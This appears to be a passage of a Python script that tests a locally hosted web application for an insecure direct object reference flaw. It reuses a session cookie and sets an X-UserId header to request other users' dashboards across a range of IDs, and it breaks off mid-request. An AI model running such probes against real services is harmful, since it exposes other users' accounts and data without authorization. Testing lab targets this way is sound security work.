import requests
import re

base_url = "http://127.0.0.1:33200"
session_cookie = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfPOA.b4xDl8YHos70T-UyrMaks8tnRhU"

cookies = {"session": session_cookie}
test_user_ids = range(10025, 10041)  # 10025-10040 inclusive

print("[*] Testing IDOR vulnerability via X-UserId header manipulation")
print(f"[*] Testing {len(test_user_ids)} user IDs: {list(test_user_ids)}")
print(f"[*] Using session cookie: {session_cookie[:30]}...")
print()

# Store responses for comparison
dashboard_responses = {}
password_responses = {}

for user_id in test_user_ids:
    headers = {"X-UserId": str(user_id)}
    
    print(f"\n[TEST] User ID: {user_id}")
    print("-" * 50)
    
    # Test 1: GET /dashboard
    try:
        resp_dashboard = requests.get(
            f"{base_url}/dashboard",
            headers=headers,
            cookies=cookies,
